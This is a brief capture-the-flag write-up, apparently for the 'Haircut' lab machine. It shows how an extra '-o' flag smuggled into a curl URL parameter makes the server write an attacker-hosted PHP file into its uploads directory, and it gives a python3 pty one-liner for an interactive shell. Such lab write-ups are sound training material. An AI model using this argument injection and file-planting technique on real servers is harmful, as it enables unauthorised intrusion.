SYNOPSIS

Haircut is a fairly simple machine, however it does touch on several useful attack vectors. Most
notably, this machine demonstrates the risk of user-specified CURL arguments, which still impacts
many active services today.

     Enumerating ports and services       Exploiting CURL/Command injection

Exploitation

The e xposed.php file simply CURLs a specified url and displays the result. By adding the -o flag
after the url, it gets tacked on to the end of the command, and saves the output to the specified
file. This achieved with http://<LAB IP>/writeup.php -o uploads/writeup.php
The file must be saved to the uploads directory as the Apache user does not have write
permissions to the main website directory.

Python is not available on the target, however Python3 is. It is possible to obtain an interactive
shell with the command python3 -c 'import pty; pty.spawn("/bin/bash")'
